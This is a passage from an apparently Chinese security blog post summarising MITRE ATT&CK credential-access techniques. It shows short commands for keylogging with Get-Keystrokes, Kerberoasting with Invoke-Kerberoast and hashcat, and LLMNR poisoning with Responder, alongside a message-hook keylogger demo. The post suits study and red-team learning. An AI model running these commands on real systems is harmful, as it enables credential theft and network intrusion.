class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>将代码编译成对应的exe和dll文件之后我们进行测试。</p>
<p>首先打开HookMain.exe程序，然后程序会自动调用对应的DLL文件，然后使用ProcessExplorer工具查看发现此时notepad.exe还没有调用Keyhook.dll</p>
<p><img src="Credential_Access.assets/1574318618698.png" alt="1574318618698"></p>
<p>在notepad.exe中尝试输入字母发现并不能输入，再次Search发现notepad已经调用了KeyHook.dll文件，键盘的输入被拦截。</p>
<p><img src="Credential_Access.assets/1574318631944.png" alt="1574318631944"></p>
<p>这是一个简单的消息钩子，使用的API是SetWindowsHookEx()这个API，在使用SetWindowsHookEx()设置好钩子之后，在某个进程中生成指定消息时，操作系统会将相关的DLL文件强制注入到响应进程，然后调用注册的钩子过程。攻击者可以通过钩子获取键盘输入、执行恶意代码、等等操作，同时还允许访问进程的内存和可能的特权。</p>
<h2 id="Input-Capture-T1056"><a href="#Input-Capture-T1056" class="headerlink" title="Input Capture-T1056"></a>Input Capture-T1056</h2><p>主要提到了键盘记录（实际上和上面提到的Hooking是相同的原理），和门户安装代码远程捕获用户凭据，主要关键点是用户输入的内容</p>
<p>提到了一些黑客使用的工具。</p>
<p>比如Cobalt Strike、Chopstick、gh0st、powersploit中的Get-Keystrokes等…工具非常多</p>
<p>这里使用Get-Keystrokes来举例，使用命令运行脚本之后，在屏幕的其他位置敲击键盘输入字符时发现Get-Keystrokes记录了输入的内容：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">. .\Get-Keystrokes.ps1</span><br><span class="line">Get-Keystrokes</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574318973123.png" alt="1574318973123"></p>
<h2 id="Input-Prompt-T1141"><a href="#Input-Prompt-T1141" class="headerlink" title="Input Prompt-T1141"></a>Input Prompt-T1141</h2><p>伪造页面诱导受害者输入账号密码，算是一种思路而不是一种具体的技术，主要是伪造比如银行、WIFI等页面。</p>
<h2 id="Kerberoasting-T1208"><a href="#Kerberoasting-T1208" class="headerlink" title="Kerberoasting-T1208"></a>Kerberoasting-T1208</h2><p>批量申请TGS票据然后进行爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-module Invoke-Kerberoast.ps1</span><br><span class="line">Invoke-kerberoast –outputformat hashcat | fl</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574319151262.png" alt="1574319151262"></p>
<p>然后将得到的内容使用hashcat工具爆破</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe –m 13100 test1.txt password.list --force</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574319165232.png" alt="1574319165232"></p>
<h2 id="Keychain-T1142"><a href="#Keychain-T1142" class="headerlink" title="Keychain-T1142"></a>Keychain-T1142</h2><p>MACOS</p>
<h2 id="LLMNR-NBT-NS-Poisoning-T1171"><a href="#LLMNR-NBT-NS-Poisoning-T1171" class="headerlink" title="LLMNR/NBT-NS Poisoning-T1171"></a>LLMNR/NBT-NS Poisoning-T1171</h2><p>攻击者通过响应LLMNR流量来欺骗请求发起者。可以结合wpad进行中间人攻击，或者是获取NTLM HASH进行爆破。</p>
<p>所用工具：Pupy、Responder、MSF</p>
<p>例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 Responder.py -I eth0</span><br></pre></td></tr></table></figure>

<p><img src="Credential_Access.assets/1574319221984.png" alt="1574319221984"></p>
<h2 id="Network-Sniffing-T1040"><a href="#Network-Sniffing-T1040" class="headerlink" title="Network Sniffing-T1040"></a>Network Sniffing-T1040</h2><p>网络嗅探是指使用系统上的网络接口来监视或捕获通过有线或无线连接发送的信息。</p>
<p>方式多种多样上文中说的Responder也是其中一种方式。工具还提到了Responder、Impacket等等。</p>
<h2 id="未完成Password-Filter-DLL-T1174"><a href="#未完成Password-Filter-DLL-T1174" class="headerlink" title="未完成Password Filter DLL-T1174"></a>未完成Password Filter DLL-T1174</h2><p>Windows中组策略中存在密码复杂度的配置</p>
<p>gpedit.msc -&gt; 本地计算机策略 -&gt; 计算机配置 -&gt; Windows设置 -&gt; 安全设置 -&gt; 帐户策略 -&gt; 密码策略 -&gt; 密码必须符合复杂性要求</p>
<p>如果密码策略满足不了对密码复杂度的要求，则可以使用Password Filter DLL进一步提高密码复杂度。</p>
<h2 id="Private-Keys-T1145"><a href="#Private-Keys-T1145" class="headerlink" title="Private Keys-T1145"></a>Private Keys-T1145</h2><p>通过搜集系统私钥来进行攻击，比如Linux中通过私钥登录SSH服务。</p>
<p>Mimikatz通过windowAPI来提取密钥</p>
<h2 id="Securityd-Memory-T1167"><a href="#Securityd-Memory-T1167" class="headerlink" title="Securityd Memory-T1167"></a>Securityd Memory-T1167</h2><p>MACOS</p>
<h2 id="Steal-Web-Session-Cookie-T1539"><a href="#Steal-Web-Session-Cookie-T1539" class="headerlink" title="Steal Web Session Cookie-T1539"></a>Steal Web Session Cookie-T1539</h2><p>说到窃取Cookie的方式实际上是很多的，比如通过存储型的XSS，在ATT&amp;CK的官网中还提到了中间人，不管是通过什么样的方式，最终的目的都是为了获取Cookie。</p>
<p>这里我想到了几个月前写的一个文章，关于Windows下利用DPAPI本地窃取Cookie的方式，主要是通过DPAPI（Data Protection Application Programming Interface）的机制来获取其他用户的Cookie。</p>
<p>篇幅太长，所以不写在这里了，链接：</p>
<h2 id="Two-Factor-Authentication-Interception-T1111"><a href="#Two-Factor-Authentication-Interception-T1111" class="headerlink" title="Two-Factor Authentication Interception-T1111"></a>Two-Factor Authentication Interception-T1111</h2><p>双因素认证的拦截，描述了攻击者可能通过一些键盘记录之类的方式来获取双因素认证中的密钥。不感兴趣懒得复现。</p>

        </div>

        
            <section class="post-copyright">
                
                
                
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/12-18-ATT&CK_Execution/">ATT&CK_Execution</a>
            
            
            <a class="next" rel="next" href="/2020/12-18-AD%E5%9F%9F%E4%B8%AD%E7%9A%84ACL%E7%A0%94%E7%A9%B6/">AD域中的ACL研究</a>
            
        </section>
	
		<section id="comments" class="comments">
		  <style>
			.comments{margin:30px;padding:10px;background:#fff}
			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
		  </style>
		  <div class="valine_comment"></div>
<!--载入js，在</body>之前插入即可-->
<!--Leancloud 操作库:-->
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<!--Valine 的核心代码库-->
<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
<script>
  new Valine({
      el: '.valine_comment',
      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
      placeholder: '这里留言。。',
      notify: 'true',
      verify: 'true',
    });
</script>
		</section>
	

    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
